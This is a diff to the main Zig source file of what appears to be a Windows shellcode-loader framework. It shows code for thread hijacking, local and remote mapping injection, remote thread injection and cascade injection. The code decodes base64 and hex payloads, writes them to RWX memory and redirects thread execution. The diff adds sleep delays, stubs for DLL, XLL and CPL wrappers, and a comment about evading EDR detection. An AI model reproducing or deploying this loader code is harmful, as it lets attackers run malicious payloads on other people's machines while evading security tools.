@@ -1,5 +1,5 @@
-// author : @zux0x0
-// zig version : 0.13.0
+// author : @zux0x3a
+// zig version : 0.14.0
 // disclaimer : this is a proof of concept and is not meant for illegal use. and i am not responsible for any damage caused by this code.
 
 const std = @import("std");
@@ -7,9 +7,9 @@ const technique_1 = @import("./hijack_thread.zig");
 const technique_2 = @import("./local_map.zig");
 const remote_mapping = @import("./remote_mapping.zig");
 const remote_thread = @import("./remote_thread.zig");
-
 const core = @import("./Core.zig");
-//const syscalls_localmap = @import("./syscalls_localmap.zig");
+const xll_core = @import("./xll_core.zig");
+const cascade = @import("./cascade.zig");
 
 const windows = std.os.windows;
 const WINAPI = windows.WINAPI;
@@ -63,6 +63,17 @@ pub extern "kernel32" fn ResumeThread(
 ) callconv(windows.WINAPI) DWORD;
 
 pub const ThreadProc = fn (param: ?LPVOID) callconv(.Win64) DWORD;
+
+const user32 = struct { // you can do struct and declare extern API like this.
+    pub extern "user32" fn MessageBoxA(
+        hWnd: ?windows.HWND,
+        lpText: [*:0]const u8,
+        lpCaption: [*:0]const u8,
+        uType: windows.UINT,
+    ) callconv(windows.WINAPI) c_int;
+};
+// change this to true to enable debug mode
+var StatusDebug = core.isDebug.false;
 
 // convert the string to a wide string UTF16-L in comptime
 fn ComptimeWS(comptime str: []const u8) []const u16 {
@@ -126,24 +137,25 @@ const ThreadFnType = *const fn (LPVOID) callconv(.C) DWORD;
 const ThreadProcedure = fn (lpParameter: ?*const anyopaque) callconv(.C) DWORD;
 
 fn someFunction(x: i32) void {
-    std.debug.print("someFunction called with {}\n", .{x});
+    if (StatusDebug) {
+        std.debug.print("someFunction called with {}\n", .{x});
+    }
 }
 
 // Global variables
 var thread_handle: HANDLE = undefined;
 
-// Sample procedure that will be executed in the thread
-
 // The thread function must match the expected signature for CreateThread
 fn myThreadFunction(param: LPVOID) DWORD {
-    std.debug.print("Thread started with parameter: {}\n", .{param});
+    _ = param;
+    // std.debug.print("Thread started with parameter: {}\n", .{param});
     return 0;
 }
 
 fn sampleProcedure(lpParameter: ?*anyopaque) callconv(.C) DWORD {
     _ = lpParameter;
 
-    std.debug.print("sampleProcedure called\n", .{});
+    //std.debug.print("sampleProcedure called\n", .{});
     return 0;
 }
 
@@ -163,7 +175,6 @@ fn bytesToHexString(allocator: Allocator, bytes: []const u8) ![]u8 {
     for (bytes) |byte| {
         try std.fmt.format(hex_string.writer(), "0x{x:0>2}, ", .{byte});
     }
-
     // Remove the trailing ", "
     if (hex_string.items.len > 2) {
         hex_string.shrinkRetainingCapacity(hex_string.items.len - 2);
@@ -228,7 +239,8 @@ fn decodeHex(allocator: Allocator, hex_string: []const u8) ![]u8 {
     var decoded = std.ArrayList(u8).init(allocator);
     defer decoded.deinit();
 
-    var iter = std.mem.split(u8, hex_string, ",");
+    //var iter = std.mem.split(u8, hex_string, ","); // this is deprecated in zig 14.0.0, there is also splitAny
+    var iter = std.mem.splitScalar(u8, hex_string, ',');
     var count: usize = 0;
     while (iter.next()) |hex_byte| {
         const trimmed = std.mem.trim(u8, hex_byte, &std.ascii.whitespace); // thanks AI for this!
@@ -245,117 +257,15 @@ fn decodeHex(allocator: Allocator, hex_string: []const u8) ![]u8 {
     return decoded.toOwnedSlice();
 }
 
-fn hijackThread(h_thread: HANDLE, payload: []const u8) !bool {
-    var old_protection: DWORD = undefined;
-
-    var thread_ctx: CONTEXT = undefined;
-    thread_ctx.ContextFlags = CONTEXT_FULL;
-    std.debug.print("T context\n", .{});
-
-    // Allocate memory for shellcode
-    const address = try windows.VirtualAlloc(null, payload.len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    std.debug.print("SC allocated at {}\n", .{payload.len});
-    if (address == @as(?*anyopaque, @ptrFromInt(0))) {
-        std.debug.print("VAlloca failed with error: {}\n", .{windows.kernel32.GetLastError()});
-        return false;
-    }
-
-    // Copy shellcode to allocated memory
-    @memcpy(@as([*]u8, @ptrCast(address)), payload);
-    // Verify the copy
-    var copy_successful = true;
-    for (payload, 0..) |byte, i| {
-        if (byte != @as([*]u8, @ptrCast(address))[i]) {
-            copy_successful = false;
-            break;
-        }
-    }
-
-    if (!copy_successful) {
-        std.debug.print("Mem copy failed\n", .{});
-        return error.MemoryCopyFailed;
-    } else {
-        std.debug.print("Mem copy successful\n", .{});
-    }
-
-    // Verify the copy
-    //   std.debug.print("Copied SC (first 16 bytes): ", .{});
-    //  for (0..@min(794, payload.len)) |i| {
-    //     std.debug.print("{x:0>2} ", .{@as([*]u8, @ptrCast(address))[i]});
-    // }
-    // std.debug.print("\n", .{});
-
-    // Change memory protection
-    windows.VirtualProtect(address, payload.len, PAGE_EXECUTE_READWRITE, &old_protection) catch |err| {
-        std.debug.print("Vprotect failed with error: {}\n", .{err});
-        return false;
-    };
-
-    // Get thread context
-    if (GetThreadContext(h_thread, &thread_ctx) == 0) {
-        std.debug.print("GetThreadContext failed with error: {}\n", .{kernel32.GetLastError()});
-        return false;
-    }
-
-    // Update instruction pointer
-    thread_ctx.Rip = @intFromPtr(address);
-
-    // Set new thread context
-    if (SetThreadContext(h_thread, &thread_ctx) == 0) {
-        std.debug.print("STC failed with error: {}\n", .{kernel32.GetLastError()});
-        return false;
-    }
-    std.debug.print("Thread hiJcked successfully\n", .{});
-    return true;
-}
-const user32 = struct {
-    pub extern "user32" fn MessageBoxA(
-        hWnd: ?windows.HWND,
-        lpText: [*:0]const u8,
-        lpCaption: [*:0]const u8,
-        uType: windows.UINT,
-    ) callconv(windows.WINAPI) c_int;
-};
 fn dummyFunction() void {
-    // stupid code
+    // stupid code but it should be replace with function stomping.
 
     _ = user32.MessageBoxA(null, "Hello World!", "Zig", 0);
-    std.debug.print("Press Enter to continue...", .{});
-    _ = std.io.getStdIn().reader().readByte() catch |err| {
-        std.debug.print("Failed to read input: {}\n", .{err});
-        return;
-    };
-}
-// not sure if going to have this in the future release due to fact is heavily detected by EDRs.
-fn SYSCALL_local_mapping_injection() void {
-    // var PAddress: ?*anyopaque = null;
-
-    //  const allocator = std.heap.page_allocator;
-
-    //  const b64_bytes = SH.getshellcodeparts();
-    //   const decoded = decodeBase64(allocator, b64_bytes) catch |err| {
-    //       std.debug.print("Failed to decode base64: {}\n", .{err});
-    //       return;
-    //   };
-    //   defer allocator.free(decoded);
-
-    //  const converted = convertEscapedHexToCommaHex(allocator, decoded) catch |err| {
-    //          std.debug.print("failed to convert escaped {}\n ", .{err});
-    //      return;
-    //  };
-    //  defer allocator.free(converted);
-
-    //const decoded_hex = decodeHex(allocator, converted) catch |err| {
-    //    std.debug.print("Failed to decode hex: {}\n", .{err});
-    //    return;
+    // std.debug.print("Press Enter to continue...", .{});
+    //  _ = std.io.getStdIn().reader().readByte() catch |err| {
+    //   std.debug.print("Failed to read input: {}\n", .{err});
+    return;
     //};
-    //  defer allocator.free(decoded_hex);
-    //  if (syscalls_localmap.LocalMappingInjectionViaSyscalls(decoded_hex.ptr, decoded_hex.len)) {
-    //      std.debug.print("[i] Local Map Inj via SCALLS Success\n", .{});
-    //  } else {
-    //      std.debug.print("[x] Local Map Injection via SYCALLS Failed\n", .{});
-    //  }
-
 }
 
 fn remote_thread_injection() void {
@@ -367,7 +277,7 @@ fn remote_thread_injection() void {
     // here is the function to execute the shellcode in remote process hijacked thread.
     const process_name = "// PROCESS NAME ";
     const allocator_1 = std.heap.page_allocator;
-    const appNameUnicode = std.unicode.utf8ToUtf16LeWithNull(allocator_1, process_name) catch undefined;
+    const appNameUnicode = std.unicode.utf8ToUtf16LeAllocZ(allocator_1, process_name) catch undefined;
 
     const allocator = std.heap.page_allocator;
 
@@ -429,11 +339,53 @@ fn remote_thread_injection() void {
     }
 }
 
+fn run_cascade_injection() void {
+    const process_name = "// PROCESS NAME ";
+
+    const allocator = std.heap.page_allocator;
+
+    var Allc = std.heap.page_allocator;
+
+    //const b64_bytes = std.mem.sliceAsBytes(b64); # Depricated
+    const b64_bytes = concat_shellcode(Allc) catch |err| {
+        std.debug.print("Failed to concat shellcode: {}\n", .{err});
+        return;
+    };
+    defer Allc.free(b64_bytes);
+
+    // const b64_bytes = SH.getshellcodeparts();
+    const decoded = decodeBase64_u16(allocator, b64_bytes) catch |err| {
+        std.debug.print("Failed to decode b64: {}\n", .{err});
+        return;
+    };
+    defer allocator.free(decoded);
+
+    const converted = convertEscapedHexToCommaHex(allocator, decoded) catch |err| {
+        std.debug.print("failed to convert escaped {}\n ", .{err});
+        return;
+    };
+    defer allocator.free(converted);
+
+    const decoded_hex = decodeHex(allocator, converted) catch |err| {
+        std.debug.print("Failed to decode hex: {}\n", .{err});
+        return;
+    };
+    defer allocator.free(decoded_hex);
+
+    const payload_buffer = cascade.Buffer{
+        .buffer = @ptrCast(decoded_hex.ptr),
+        .length = decoded_hex.len,
+    };
+
+    const status = cascade.cascadeInject(process_name, &payload_buffer, null);
+    std.debug.print("C: {}\n", .{status});
+}
+
 fn remote_map_injection() void {
     const process_name = "// PROCESS NAME ";
 
     const allocator_1 = std.heap.page_allocator;
-    const appNameUnicode = std.unicode.utf8ToUtf16LeWithNull(allocator_1, process_name) catch undefined;
+    const appNameUnicode = std.unicode.utf8ToUtf16LeAllocZ(allocator_1, process_name) catch undefined;
 
     const allocator = std.heap.page_allocator;
 
@@ -484,7 +436,7 @@ fn local_map_injection() void {
 
     //const b64_bytes = std.mem.sliceAsBytes(b64); # Depricated
     const b64_bytes = concat_shellcode(Allc) catch |err| {
-        std.debug.print("Failed to concat shellcode: {}\n", .{err});
+        std.debug.print("Failed to concat shellcode: {}\n", .{err}); // if debug mode is enabled, enable this functions.
         return;
     };
     defer Allc.free(b64_bytes);
@@ -529,7 +481,7 @@ fn local_map_injection() void {
 fn createThreadAndExecute(proc: ThreadFnType) void {
     var thread_id: DWORD = undefined;
     // var Allc: *std.mem.Allocator = undefined;
-    //@constCast(@ptrCast(@alignCast(&dummyFunction))) # Zig 13 -> 14 ..etc fuck this ecosystem.
+    //@constCast(@ptrCast(@alignCast(&dummyFunction))) # Zig 13 -> 14 ..etc fuck this, now i understand it better .
     std.debug.print("proc: {}\n", .{@as(*ThreadFnType, @constCast(@ptrCast(@alignCast(&proc))))}); // Garbage code to see the proc pointer
     //_ = proc(); // shit
     // const threadProc: windows.LPTHREAD_START_ROUTINE = @ptrCast(windows.LPTHREAD_START_ROUTINE, @alignCast(@alignOf(fn () callconv(.C) DWORD), &proc)); # Depricated
@@ -569,6 +521,7 @@ fn createThreadAndExecute(proc: ThreadFnType) void {
 
     var decoded_hex = decodeHex(allocator, converted) catch |err| {
         std.debug.print("Failed to decode hex: {}\n", .{err});
+
         return;
     };
     _ = &decoded_hex; // pointless discard of local variable
@@ -582,15 +535,18 @@ fn createThreadAndExecute(proc: ThreadFnType) void {
     //   std.debug.print("\n", .{});
 
     if (thread_handle != windows.INVALID_HANDLE_VALUE) { // if not null then we can hijack the thread and execute our payload
-
+        std.time.sleep(std.time.ns_per_ms * 5000);
         _ = technique_1.hijackThread(thread_handle, @ptrCast(decoded_hex)) catch |err| {
             std.debug.print("Thread Hjcke failed: {}\n", .{err});
             return;
         };
-
+        std.time.sleep(std.time.ns_per_ms * 5000);
         _ = ResumeThread(thread_handle);
+        // _ = windows.WaitForSingleObject(windows.INVALID_HANDLE_VALUE, windows.INFINITE) catch unreachable;
     }
 }
 
 // ENTRY_DLL
 // ENTRY_XLL
+// ENTRY_CPL
+// CPL_WRAPPER
